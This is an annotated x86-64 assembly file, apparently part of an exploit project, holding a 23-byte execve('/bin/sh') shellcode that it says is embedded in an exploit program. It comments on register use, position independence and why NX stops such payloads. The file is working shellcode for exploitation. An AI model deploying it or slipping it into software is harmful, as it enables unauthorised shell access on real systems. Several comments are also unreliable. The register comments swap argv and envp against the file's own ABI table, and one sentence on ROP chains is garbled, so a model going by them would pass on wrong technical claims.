; ===========================================================================
; shellcode.S -- the reference version of the 23 bytes embedded in fooc.c
; ===========================================================================
;
; This file exists for ONE reason: to let you prove that the `SHELLCODE[]`
; array in fooc.c is exactly the machine code you would get from assembling
; these instructions. It is not used by the exploit, which carries the bytes
; inline so it has no runtime dependency on nasm.
;
;   make verify-shellcode   assembles this and diffs it against fooc.c
;
; WHAT IT DOES
; ------------
;   execve("/bin/sh", argv = NULL, envp = NULL)
;
;   ... and that is the whole payload. There is no loop, no decoder, no
;   egg-hunter: 23 bytes that turn the process into a shell.
;
; THE ABI
; -------
; The System V AMD64 calling convention, and the kernel's syscall convention,
; agree on the register layout, which is why one sequence serves both:
;
;   rdi   1st argument        -> the pathname
;   rsi   2nd argument        -> argv
;   rdx   3rd argument        -> envp
;   rax   syscall number      -> 59 = execve
;
; Passing argv = NULL makes the kernel synthesise argv[0] from the pathname,
; and envp = NULL gives the new program an empty environment. The shell runs
; fine, but with no PATH, so `id` and `uname` work and bare `vi` does not --
; a small detail that surprises people, and the reason fooc's own local shell
; uses execv() with a real environment instead.
;
; ASSEMBLY NOTES
; --------------
;   * `mov rdi, 0x68732f6e69622f` needs the REX.W prefix and a 64-bit
;     immediate, so it is spelled `movabs` in AT&T syntax (or `mov r64,
;     imm64` in Intel syntax). The immediate is the eight ASCII bytes
;     "/bin/sh\0" read as a little-endian 64-bit number -- the NUL comes free
;     because it is the high byte of the little-endian representation, which is
;     the top of the string.
;
;   * We `push rdi` rather than putting the string in a `.data` section
;     because the payload must be position independent: it will sit at whatever
;     address the target's stack (or, in a ROP chain, wherever the attacker
;     chose) happens to be. RIP-relative addressing would break, `push` will
;     not.
;
;   * `push 0x3b; pop rax` is the idiomatic 2-byte way to load a small syscall
;     number. `mov eax, 0x3b` is 5 bytes, which matters in a payload.
;
;   * There is no `ret` at the end. execve replaces the process image and never
;     returns, so anything after `syscall` is dead code. The shell you get never
;     runs our bytes again -- which is why the parent process's stack, and
;     therefore the corrupted return address, is irrelevant once this fires.
;
; WHY THIS IS THE THING NX BIT EXISTS TO STOP
; -------------------------------------------
; These bytes must land on an executable page. The stack normally is not, so
; on any modern system the CPU raises SIGSEGV the moment `ret` transfers control
; into the payload. That single hardware feature is why real-world ROP chains
; look like this file and not like this file: with NX on, the attacker reuses
; code that already exists in the binary or in libc. See README.md.
; ===========================================================================

                BITS 64

; section .text   -- mark it executable, the default, so `nasm -f bin` emits
;                    the instruction bytes with no ELF wrapper around them.
                section .text

; ---------------------------------------------------------------------------
;   xor    esi, esi
;   rsi = 0  ->  envp = NULL
;
;   Zeroing with xor instead of `mov esi, 0` is two bytes shorter (2 vs 5) and
;   the classic x86 idiom for producing a zero without a memory operand. It
;   also has a side effect: the zeroing flag form skips the dependency-breaking
;   trick some old CPUs needed, which no longer matters.
; ---------------------------------------------------------------------------
                xor    esi, esi

; ---------------------------------------------------------------------------
;   xor    edx, edx
;   rdx = 0  ->  argv = NULL
; ---------------------------------------------------------------------------
                xor    edx, edx

; ---------------------------------------------------------------------------
;   movabs rdi, 0x68732f6e69622f
;   rdi = the 8 bytes 2f 62 69 6e 2f 73 68 00, i.e. "/bin/sh\0"
;
;   Read the immediate right-to-left as bytes and it spells the string out.
;   That packing is the whole trick: eight bytes of payload in a ten-byte
;   instruction, no data section, no relocation, no alignment padding.
; ---------------------------------------------------------------------------
                movabs rdi, 0x68732f6e69622f

; ---------------------------------------------------------------------------
;   push   rdi
;   Put those eight bytes on the stack, where a string has to live so that a
;   register can point at it. The stack is writable and is at a known
;   (attacker-chosen) address, so this is the position-independent way to
;   materialise a string constant.
; ---------------------------------------------------------------------------
                push   rdi

; ---------------------------------------------------------------------------
;   mov    rdi, rsp
;   rdi = the address of the string we just pushed = argv[0] as well as the
;   pathname. Reusing one buffer for both is legal; the kernel only reads the
;   pathname before it sets up the new stack, and by then argv[0] is copied.
; ---------------------------------------------------------------------------
                mov    rdi, rsp

; ---------------------------------------------------------------------------
;   push   0x3b
;   pop    rax
;   rax = 59 = the __NR_execve slot in the x86-64 syscall table.
;
;   Syscall numbers are part of the kernel ABI and are frozen: 0 = read,
;   1 = write, 2 = open, ..., 59 = execve. They are not sequential by function,
;   they are fixed by history, which is why they are also a handy way for an
;   analyst to recognise a payload.
; ---------------------------------------------------------------------------
                push   0x3b
                pop    rax

; ---------------------------------------------------------------------------
;   syscall
;   Trap into the kernel. On return, either we are a shell (success) or we
;   are handed a -errno in rax and fall off the end of the payload (failure).
; ---------------------------------------------------------------------------
                syscall

; Note what is NOT here:
;   * no `ret`       -- execve does not return.
;   * no `nop` sled   -- we jump straight to the first byte.
;   * no `jmp $+N`    -- nothing to reach.
